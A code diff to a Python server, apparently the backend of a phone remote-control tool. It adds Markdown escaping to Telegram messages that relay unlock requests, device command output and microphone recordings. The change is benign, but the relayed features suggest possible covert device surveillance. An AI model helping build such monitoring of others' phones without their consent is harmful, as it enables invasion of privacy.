@@ -50,6 +50,12 @@ _temp_uploads: dict = {}
 
 VALID_NAMES = ["android", "security", "безопасность", "звонки", "system", "phonecontrol"]
 
+def escape_md(s: str) -> str:
+    """Экранирует спецсимволы Markdown v1 для Telegram."""
+    for ch in ("_", "*", "`", "[", "]", "(", ")"):
+        s = s.replace(ch, f"\\{ch}")
+    return s
+
 # ─── Keep-alive ───────────────────────────────────────────────────────────────
 
 async def keep_alive():
@@ -1205,7 +1211,7 @@ async def upload(
         # Отправляем боту с кнопками подтверждения
         asyncio.create_task(send_tg_file(
             chat_id, data, filename,
-            f"📸 *Запрос на разблокировку*\nУстройство: `{dev_id}`\nФайл: {filename}\n\nПодтвердить разблокировку?",
+            f"📸 *Запрос на разблокировку*\nУстройство: `{escape_md(dev_id)}`\nФайл: {escape_md(filename)}\n\nПодтвердить разблокировку?",
             reply_markup=code_confirm_keyboard(dev_id, chat_id)
         ))
     else:
@@ -1448,9 +1454,10 @@ async def cmd_output(
     model   = devices.get(dev_id, {}).get("model", dev_id)
     if chat_id:
         text = output[:3800] if len(output) > 3800 else output
-        suffix = "\n\n_...вывод обрезан_" if len(output) > 3800 else ""
+        suffix = "\n\n...вывод обрезан" if len(output) > 3800 else ""
+        safe_text = text.replace("`", "'")
         await send_tg(chat_id,
-            f"💻 *{model}* — `{command}`\n\n```\n{text}\n```{suffix}")
+            f"💻 *{escape_md(model)}* — `{escape_md(command)}`\n\n```\n{safe_text}\n```{suffix}")
     return {"ok": True}
 
 
@@ -1505,5 +1512,5 @@ async def audio_upload(
     model = devices.get(dev_id, {}).get("model", dev_id)
 
     await send_tg_file(chat_id, data, audio.filename or "record.m4a",
-                       caption=f"🎙 *{model}* — запись микрофона")
+                       caption=f"🎙 {escape_md(model)} — запись микрофона")
     return {"ok": True}
